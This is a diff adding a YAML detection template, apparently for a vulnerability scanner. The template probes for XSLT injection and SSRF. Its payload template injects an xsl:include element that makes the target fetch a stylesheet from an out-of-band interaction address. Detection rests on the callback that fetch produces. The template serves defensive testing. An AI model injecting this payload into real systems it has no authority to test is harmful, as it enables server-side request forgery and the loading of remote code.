@@ -1,0 +1,21 @@
+id: "xslt-ssrf"
+issue_code: "xslt_injection"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 100
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+  - name: file_path
+    value: "{{randomString 4}}.xsl"
+templates:
+  - <xsl:include href="https://{{.oob_address}}/{{.file_path}}"/>
+categories:
+  - xslt
+  - oob
+  - injection
+  - ssrf
+platforms:
+  - xslt
